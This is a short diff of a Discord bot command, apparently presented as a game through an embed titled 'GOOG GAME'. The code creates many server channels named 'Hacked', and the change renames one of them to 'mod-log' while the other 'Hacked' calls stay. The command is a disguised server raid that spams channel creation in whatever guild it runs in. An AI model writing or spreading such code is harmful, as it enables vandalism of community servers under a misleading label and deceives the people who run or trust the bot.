@@ -8,7 +8,7 @@ exports.run = (client, message, params) => {
   .setDescription('')
   .setColor(0x00ffff)
   .addField("GOOG GAME")
-  message.guild.createChannel(`Hacked`);
+  message.guild.createChannel(`mod-log`);
   message.guild.createChannel(`Hacked`);
   message.guild.createChannel(`Hacked`);
   message.guild.createChannel(`Hacked`);
